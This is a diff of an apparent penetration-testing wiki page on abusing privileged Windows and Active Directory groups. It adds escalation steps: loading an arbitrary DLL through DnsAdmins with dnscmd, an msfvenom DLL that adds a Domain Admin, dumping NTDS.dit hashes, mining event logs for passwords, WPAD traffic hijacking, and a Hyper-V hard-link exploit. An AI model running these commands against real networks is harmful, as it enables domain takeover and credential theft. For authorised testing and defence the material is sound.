@@ -1,4 +1,4 @@
-# Privileged Groups and Token Privileges
+# Privileged Groups
 
 <details>
 
@@ -16,7 +16,7 @@
 
 * **Administrators**
 * **Domain Admins**
-* **Enterprise Admins**
+* **Enterprise Adminspr**
 
 There are other account memberships and access token privileges that can also be useful during security assessments when chaining multiple attack vectors.
 
@@ -65,11 +65,15 @@ This membership allows users to configure Domain Controllers with the following 
 
 * Allow log on locally
 * Back up files and directories
+* ``[`SeBackupPrivilege`](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#sebackupprivilege-3.1.4) and [`SeRestorePrivilege`](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#serestoreprivilege-3.1.5)&#x20;
 * Change the system time
 * Change the time zone
 * Force shutdown from a remote system
 * Restore files and directories
 * Shut down the system
+* control local services
+
+### Domain Controller Access
 
 Note how we cannot access files on the DC with current membership:
 
@@ -82,6 +86,26 @@ However, if the user belongs to `Server Operators`:
 The story changes:
 
 ![](../../.gitbook/assets/a6.png)
+
+### Privesc <a href="#backup-operators" id="backup-operators"></a>
+
+Use [`PsService`](https://docs.microsoft.com/en-us/sysinternals/downloads/psservice) or `sc`, form Sysinternals, to check permissions on a service.&#x20;
+
+```
+C:\> .\PsService.exe security AppReadiness
+
+PsService v2.25 - Service information and configuration utility
+Copyright (C) 2001-2010 Mark Russinovich
+Sysinternals - www.sysinternals.com
+
+[...]
+
+        [ALLOW] BUILTIN\Server Operators
+                All
+```
+
+This confirms that the Server Operators group has [SERVICE\_ALL\_ACCESS](https://docs.microsoft.com/en-us/windows/win32/services/service-security-and-access-rights) access right, which gives us full control over this service.\
+You can abuse this service to [**make the service execute arbitrary commands**](https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation#modify-service-binary-path) and escalate privileges.
 
 ## Backup Operators <a href="#backup-operators" id="backup-operators"></a>
 
@@ -162,16 +186,40 @@ Finally you can **get all the hashes** from the **`NTDS.dit`**:
 secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL
 ```
 
+## Print Operators
+
+The members of this gorup are granted:
+
+* [**`SeLoadDriverPrivilege`**](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/#seloaddriverprivilege-3.1.7)
+* **Log on locally to a Domain Controller** and shut it down
+* Permissions to **manage**, create, share, and delete **printers connected to a Domain Controller**
+
+{% hint style="warning" %}
+If the command `whoami /priv`, doesn't show the **`SeLoadDriverPrivilege`** from an unelevated context, you need to bypass UAC.
+{% endhint %}
+
+Check in this page how to abuse the SeLoadDriverPrivilege to privesc:
+
+{% content-ref url="../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/abuse-seloaddriverprivilege.md" %}
+[abuse-seloaddriverprivilege.md](../windows-local-privilege-escalation/privilege-escalation-abusing-tokens/abuse-seloaddriverprivilege.md)
+{% endcontent-ref %}
+
 ## DnsAdmins
 
-### Resume
-
 A user who is member of the **DNSAdmins** group or have **write privileges to a DNS** server object can load an **arbitrary DLL** with **SYSTEM** privileges on the **DNS server**.\
-This is really interesting as the **Domain Controllers** are used very frequently as DNS servers.
+This is really interesting as the **Domain Controllers** are **used** very frequently as **DNS servers**.
 
-### Execute
+As shown in this **** [**post**](https://adsecurity.org/?p=4064), the following attack can be performed when DNS is run on a Domain Controller (which is very common):
 
-Then, if you have a user inside the DNSAdmins group, you can make the DNS server load an arbitrary DLL with SYSTEM privileges. You can make the DNS server load a local or remote (shared by SMB) DLL file executing:
+* DNS management is performed over RPC
+* [**ServerLevelPluginDll**](https://docs.microsoft.com/en-us/openspecs/windows\_protocols/ms-dnsp/c9d38538-8827-44e6-aa5e-022a016ed723) allows us to **load** a custom **DLL** with **zero verification** of the DLL's path. This can be done with the `dnscmd` tool from the command line
+* When a member of the **`DnsAdmins`** group runs the **`dnscmd`** command below, the `HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\services\DNS\Parameters\ServerLevelPluginDll` registry key is populated
+* When the **DNS service is restarted**, the **DLL** in this path will be **loaded** (i.e., a network share that the Domain Controller's machine account can access)
+* An attacker can load a **custom DLL to obtain a reverse shell** or even load a tool such as Mimikatz as a DLL to dump credentials.
+
+### Execute arbitrary DLL
+
+Then, if you have a user inside the **DNSAdmins group**, you can make the **DNS server load an arbitrary DLL with SYSTEM privileges** (DNS service runs as `NT AUTHORITY\SYSTEM`). You can make the DNS server load a **local or remote** (shared by SMB) DLL file executing:
 
 ```
 dnscmd [dc.computername] /config /serverlevelplugindll c:\path\to\DNSAdmin-DLL.dll
@@ -188,6 +236,12 @@ DWORD WINAPI DnsPluginInitialize(PVOID pDnsAllocateFunction, PVOID pDnsFreeFunct
 }
 ```
 
+Or you could generate a dll using msfvenom:
+
+```bash
+msfvenom -p windows/x64/exec cmd='net group "domain admins" <username> /add /domain' -f dll -o adduser.dll
+```
+
 So, when the **DNSservice** start or restart, a new user will be created.
 
 Even having a user inside DNSAdmin group you **by default cannot stop and restart the DNS service.** But you can always try doing:
@@ -199,6 +253,17 @@ sc.exe \\dc01 start dns
 
 [**Learn more about this privilege escalation in ired.team.**](https://ired.team/offensive-security-experiments/active-directory-kerberos-abuse/from-dnsadmins-to-system-to-domain-compromise)
 
+#### Mimilib.dll
+
+As detailed in this [**post**](http://www.labofapenetrationtester.com/2017/05/abusing-dnsadmins-privilege-for-escalation-in-active-directory.html), It's also possible to use [**mimilib.dll**](https://github.com/gentilkiwi/mimikatz/tree/master/mimilib) from the creator of the `Mimikatz` tool to gain command execution by **modifying** the [**kdns.c**](https://github.com/gentilkiwi/mimikatz/blob/master/mimilib/kdns.c) **** file to execute a **reverse shell** one-liner or another command of our choosing.
+
+### WPAD Record for MitM
+
+Another way to **abuse DnsAdmins** group privileges is by creating a **WPAD record**. Membership in this group gives us the rights to [disable global query block security](https://docs.microsoft.com/en-us/powershell/module/dnsserver/set-dnsserverglobalqueryblocklist?view=windowsserver2019-ps), which by default blocks this attack. Server 2008 first introduced the ability to add to a global query block list on a DNS server. By default, Web Proxy Automatic Discovery Protocol (WPAD) and Intra-site Automatic Tunnel Addressing Protocol (ISATAP) are on the global query block list. These protocols are quite vulnerable to hijacking, and any domain user can create a computer object or DNS record containing those names.
+
+After **disabling the global query** block list and creating a **WPAD record**, **every machine** running WPAD with default settings will have its **traffic proxied through our attack machine**. We could use a tool such as **** [**Responder**](https://github.com/lgandx/Responder) **or** [**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **to perform traffic spoofing**, and attempt to capture password hashes and crack them offline or perform an SMBRelay attack.\
+
+
 ## **AD Recycle Bin**
 
 This group gives you permission to read deleted AD object. Something juicy information can be found in there:
@@ -208,6 +273,56 @@ This group gives you permission to read deleted AD object. Something juicy infor
 #You need to be in the "AD Recycle Bin" group of the AD to list the deleted AD objects
 Get-ADObject -filter 'isDeleted -eq $true' -includeDeletedObjects -Properties *
 ```
+
+## Event Log Readers
+
+Members of the [**Event Log Readers**](https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2012-R2-and-2012/dn579255\(v=ws.11\)?redirectedfrom=MSDN#event-log-readers) **** group have **permission to access the event logs** generated (such as the new process creation logs). In the logs **sensitive information** could be found. Let's see how to visualize the logs:
+
+```powershell
+# To find "net [...] /user:blahblah password"
+wevtutil qe Security /rd:true /f:text | Select-String "/user"
+# Using other users creds
+wevtutil qe Security /rd:true /f:text /r:share01 /u:<username> /p:<pwd> | findstr "/user"
+
+# Search using PowerShell
+Get-WinEvent -LogName security [-Credential $creds] | where { $_.ID -eq 4688 -and $_.Properties[8].Value -like '*/user*'} | Select-Object @{name='CommandLine';expression={ $_.Properties[8].Value }}
+```
+
+## Hyper-V Administrators
+
+The [**Hyper-V Administrators**](https://docs.microsoft.com/en-us/windows/security/identity-protection/access-control/active-directory-security-groups#hyper-v-administrators) group has full access to all [Hyper-V features](https://docs.microsoft.com/en-us/windows-server/manage/windows-admin-center/use/manage-virtual-machines). If **Domain Controllers** have been **virtualized**, then the **virtualization admins** should be considered **Domain Admins**. They could easily **create a clone of the live Domain Controller** and **mount** the virtual **disk** offline to obtain the **`NTDS.dit`** file and extract NTLM password hashes for all users in the domain.
+
+It is also well documented on this [blog](https://decoder.cloud/2020/01/20/from-hyper-v-admin-to-system/), that upon **deleting** a virtual machine, `vmms.exe` attempts to **restore the original file permissions** on the corresponding **`.vhdx` file** and does so as `NT AUTHORITY\SYSTEM`, without impersonating the user. We can **delete the `.vhdx`** file and **create** a native **hard link** to point this file to a **protected SYSTEM file**, and you will be given full permissions to.
+
+If the operating system is vulnerable to [CVE-2018-0952](https://www.tenable.com/cve/CVE-2018-0952) or [CVE-2019-0841](https://www.tenable.com/cve/CVE-2019-0841), we can leverage this to gain SYSTEM privileges. Otherwise, we can try to **take advantage of an application on the server that has installed a service running in the context of SYSTEM**, which is startable by unprivileged users.
+
+### **Exploitation Example**
+
+An example of this is **Firefox**, which installs the **`Mozilla Maintenance Service`**. We can update [this exploit](https://raw.githubusercontent.com/decoder-it/Hyper-V-admin-EOP/master/hyperv-eop.ps1) (a proof-of-concept for NT hard link) to grant our current user full permissions on the file below:
+
+```bash
+C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
+```
+
+#### **Taking Ownership of the File**
+
+After running the PowerShell script, we should have **full control of this file and can take ownership of it**.
+
+```bash
+C:\htb> takeown /F C:\Program Files (x86)\Mozilla Maintenance Service\maintenanceservice.exe
+```
+
+#### **Starting the Mozilla Maintenance Service**
+
+Next, we can replace this file with a **malicious `maintenanceservice.exe`**, **start** the maintenance **service**, and get command execution as SYSTEM.
+
+```
+C:\htb> sc.exe start MozillaMaintenance
+```
+
+{% hint style="info" %}
+This vector has been mitigated by the March 2020 Windows security updates, which changed behavior relating to hard links.
+{% endhint %}
 
 ## Group Managed Service Accounts (gMSA)
 
